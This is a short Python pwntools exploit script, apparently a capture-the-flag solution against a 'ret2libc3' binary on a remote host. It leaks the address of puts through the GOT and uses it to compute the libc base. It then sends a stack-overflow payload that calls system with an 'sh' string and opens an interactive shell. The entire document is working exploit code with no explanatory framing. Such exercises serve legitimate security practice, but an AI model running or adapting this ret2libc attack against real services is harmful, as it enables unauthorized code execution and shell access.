from pwn import *

#io = process("./ret2libc3")

io = remote("106.54.129.202", 10002)

elf = ELF("./ret2libc3")

libc = ELF("libc-2.23.so")

io.sendlineafter(b" :", str(elf.got["puts"]))

#send = str(elf.got["puts"])

io.recvuntil(b" : ")

libcbase = int(io.recvuntil(b"\n", drop = True), 16) - libc.symbols["puts"]

#re = 0xf7d75cd0

#re2 = libc.symbols["puts"]

#libcBase = int(re-re2)

#success("libcBase -> {:#x}".format(libcBase))

payload = flat(cyclic(60),libcbase+libc.symbols["system"],0xdeadbeef,next(elf.search(b"sh\x00")))

io.sendlineafter(b" :", payload)

io.interactive()


#print(re2)

#print(payload)
